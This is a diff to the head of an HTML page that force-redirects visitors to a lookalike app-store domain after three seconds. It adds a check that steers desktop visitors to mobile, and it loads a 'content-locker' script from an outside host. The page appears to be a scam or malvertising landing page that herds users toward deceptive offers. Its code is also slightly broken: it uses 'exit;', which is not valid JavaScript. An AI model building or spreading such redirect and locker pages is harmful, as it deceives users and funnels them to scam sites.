@@ -1,10 +1,16 @@
 <html>
 <head><script>
-setTimeout(function(){doit();}, 3000);
 function doit() {
   top.location.href='http://snaplander.appstore.blue/';
 }
+if( /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent) ) {
+
+} else {
+alert("Visit this site on your mobile!");
+exit;
+}
   
+setTimeout(function(){doit();}, 3000);
 </script>
 <script type="text/javascript" src="http://verificationplace.com/admin/js/content-locker.js.php?iv=91442646&ct=QUwbfn8Pffk%3D"></script>
 </head>
